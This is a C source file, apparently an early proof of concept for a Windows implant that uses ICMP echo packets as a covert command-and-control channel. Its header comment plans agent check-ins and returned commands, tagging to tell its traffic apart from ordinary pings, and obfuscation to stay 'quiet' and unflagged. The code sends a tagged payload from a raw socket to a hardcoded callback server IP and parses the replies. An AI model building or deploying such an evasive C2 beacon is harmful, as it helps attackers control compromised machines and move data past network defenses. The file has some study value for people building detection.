/*
POC: ICMP Send/Receive

Pros;
  - Quiet


Cons:

  - No protocol built in safeguards.
    - session tracking


Maybe Problems:

 - Type 8 sends the alphabet on basic ping checks. This might get flagged if not this value

 - [ ] OS likes to respond to icmp echo replies. 
        Fix: 
            option 1: Disable echo replies on linux: 
                `sudo sysctl -w net.ipv4.icmp_echo_ignore_all=1`
            option 2: IP Tables filter out anything not containing TAG:
                 `sudo iptables -A INPUT -p icmp --icmp-type echo-request -m string --algo bm --string "HCKD" -j DROP`
                 - only works with unencrypted payloads due to tag in payload



Fixes:

 - Checkout waht some toosl that implemented ICMP did:
    PingTunnel?
    Loki?



Standard ICMP Flow for reference:
[ Your System  ]                  [ Remote Host (e.g. 8.8.8.8) ]
          |                                         |
          | ------ ICMP Echo Request  ------------> |
          |                                         |
          | <----- ICMP Echo Reply  --------------- |
          |                                         |



Idea flow for implementation
     [ (Agent) ]                              [ C2 Server ]
          |                                         |
     ---->| ------ ICMP Echo Request  ------------> | (ex, checkin, or send data back)--|
Do things |                                         |                                   | Server Stuff
     ^----| <----- ICMP Echo Reply  --------------- | (ex, command coming back) <--------
          |                                         |

//NOTE: ryan... go review ICMP standards/structure and amke sure you know all of this


ICMP Packet Header (bytes)
| Type (1) | Code (1) | Checksum (2) | Identifier (2) | Sequence Number (2) | Payload (variable, up to 32 bytes on win) |
|----------|----------|--------------|----------------|---------------------|-------------------------------------------|

or in a struct:

struct icmp_header {
    uint8_t Type;          // 8 for Echo Request
    uint8_t Code;          // 0
    uint16_t Checksum;     // Checksum of entire ICMP message
    uint16_t ID;           // Identifier to match requests/replies 
    uint16_t Sequence;     // Sequence number for tracking requests
};

Protocol Breakdown:
    IMCP Header=8 bytes (64 bits)
    IP Headers=20
    Payload=
        MTU 1500: 1472 bytes per payload
        Max IPV4 size= 65507-28 = 65,479, but this is known as the ping of death & may flag
        "unix normal": 56 byte default payload field (+8 for header contents = 64 + 20 ipv4 = 84)
        "windows normal": 32 byte default payload field (+8 for header contents + 20 for ipv4 headers = 60)



Modifications of ICMP protocol for this application:

struct icmp_header {
    uint8_t Type;          // 8 for Echo Request
    uint8_t Code;          // 0
    uint16_t Checksum;     // Checksum of entire ICMP message
    uint16_t ID;           // Identifier to match requests/replies - lets use PID. 
    uint16_t Sequence;     // Sequence number for tracking requests. Starts at 0, inline with windows ping behavior
};

Client sends initial message with length of inbound message. Sequence = 0. Seq 0 is ALWAYS the message size.

Payload should have the first 4 bytes be a tag. Default is "RQ47", on first 2 bytes. DO NOT use anything in alphabetical order (ex ABCD)... that's what normal
pings send, and will likely confuse the server.

Server should allocate a buffer of this size.

Server then monitors for packet with Seq 1, matching ID, and first 4 bytes being the TAG (ex, RQ47)
Server appends the data section to the buffer.
Server then Sends response back to ICMP request. 

Client gets response data, this response MUST contain the tag, otherwise the response is discarded. This is so an OS reply doesn't slip past by accident, etc. 

When client has sent all data OR a finish flag is received (CANNOT use seq or PID here), server stops listenening, and 
passes data to Team Server




*/


#define _WINSOCK_DEPRECATED_NO_WARNINGS
#pragma comment(lib, "ws2_32.lib")

#include <stdio.h>
#include <winsock2.h>
#include <windows.h>

#define ICMP_ECHO 8
#define ICMP_ECHOREPLY 0
//size of payload/data section of icmp.
//ideally, the program will do the math & figure out how to chunk messages based on this size. Currently, it does not
#define ICMP_PAYLOAD_SIZE 32
#define ICMP_CALLBACK_SERVER "172.19.89.43"
#define ICMP_TAG "RQ47"

struct icmp_header {
    BYTE Type;
    BYTE Code;
    USHORT Checksum;
    USHORT ID;
    USHORT Sequence;
};


// Checksum function
USHORT checksum(USHORT* buffer, int size) {
    unsigned long cksum = 0;
    while (size > 1) {
        cksum += *buffer++;
        size -= sizeof(USHORT);
    }
    if (size) {
        cksum += *(UCHAR*)buffer;
    }
    cksum = (cksum >> 16) + (cksum & 0xffff);
    cksum += (cksum >> 16);
    return (USHORT)(~cksum);
}

// Send ICMP Echo Request
int send_icmp(SOCKET s, struct sockaddr_in* dest) {
    char packet[60] = { 0 };

    struct icmp_header* icmp = (struct icmp_header*)packet;
    icmp->Type = ICMP_ECHO;
    icmp->Code = 0;
    icmp->ID = (USHORT)GetCurrentProcessId();
    icmp->Sequence = 1;


    //tagless version
    //char* data = packet + sizeof(struct icmp_header);
    //strcpy_s(data, ICMP_PAYLOAD_SIZE, "ShmingusBingus");

    //tagged version
    char* data = packet + sizeof(struct icmp_header);
    const char* tag = ICMP_TAG; //4 byte tag
    const char* real_data = "ShmingusBingus"; // payload

    // Combine TAG + DATA into buffer safely
    snprintf(data, ICMP_PAYLOAD_SIZE, "%s%s", tag, real_data);

    icmp->Checksum = 0;
    icmp->Checksum = checksum((USHORT*)packet, sizeof(packet));

    printf("[+] Sending ICMP Echo Request...\n");

    /*
    EX: XOR payload, or do whatever to keep it quiet/obsfuctated, here

    encrypt_payload(&payload);

    */

    int result = sendto(s, packet, sizeof(packet), 0, (SOCKADDR*)dest, sizeof(*dest));
    if (result == SOCKET_ERROR) {
        printf("[-] sendto failed: %d\n", WSAGetLastError());
        return -1;
    }

    printf("[+] Packet sent. Dump:\n");
    printf("    Type: %d\n", icmp->Type);
    printf("    Code: %d\n", icmp->Code);
    printf("    ID: %d\n", ntohs(icmp->ID));
    printf("    Seq: %d\n", ntohs(icmp->Sequence));
    printf("    Payload: %s\n", data);

    return 0;
}

// Receive ICMP Echo Reply
void recv_icmp(SOCKET s) {
    char recvbuf[1024];
    SOCKADDR_IN from;
    int fromlen = sizeof(from);

    printf("[+] Waiting for ICMP Echo Reply...\n");

    int bytes = recvfrom(s, recvbuf, sizeof(recvbuf), 0, (SOCKADDR*)&from, &fromlen);
    if (bytes == SOCKET_ERROR) {
        printf("[-] recvfrom failed: %d\n", WSAGetLastError());
        return;
    }

    printf("[+] Received %d bytes from %s\n", bytes, inet_ntoa(from.sin_addr));

    // Skip IP header (assumed 20 bytes)
    struct icmp_header* icmp = (struct icmp_header*)(recvbuf + 20);
    char* payload = (char*)(recvbuf + 20 + sizeof(struct icmp_header));

    /*
    EX: Decrypt Payload here (operate directly on payload

    decrypt_payload(&payload);

    */


    //check first 4 bytes the tag to make sure it's correct
    if (bytes < 28 || strncmp(payload, ICMP_TAG, 4) != 0) {
        printf("[-] Invalid or untagged ICMP payload\n");
        return;
    }

    printf("    Type: %d\n", icmp->Type);
    printf("    Code: %d\n", icmp->Code);
    printf("    ID: %d\n", ntohs(icmp->ID));
    printf("    Seq: %d\n", ntohs(icmp->Sequence));
    //these use a format specifier to only print X bytes, hence the 2 args here
    printf("    Payload: %.*s\n", bytes - 28, payload); // 20 (IP) + 8 (ICMP header)
    printf("    Payload (tagless): %.*s\n", bytes - 32, payload + 4); // 20 (IP) + 8 (ICMP header)

}

int main() {
    printf("[+] ICMP WIN\n");
    const char* SERVER_IP = ICMP_CALLBACK_SERVER;
    printf("[+] SERVER: %s\n", SERVER_IP);

    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);


    printf("[+] Creating raw socket...\n");
    SOCKET s = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (s == INVALID_SOCKET) {
        printf("[-] Error creating socket: %d\n", WSAGetLastError());
        return 1;
    }


    struct sockaddr_in dest;
    dest.sin_family = AF_INET;
    dest.sin_addr.s_addr = inet_addr(SERVER_IP);  // Replace with your C2 server IP

    if (send_icmp(s, &dest) == 0) {
        recv_icmp(s);
    }

    closesocket(s);
    WSACleanup();
    return 0;
}
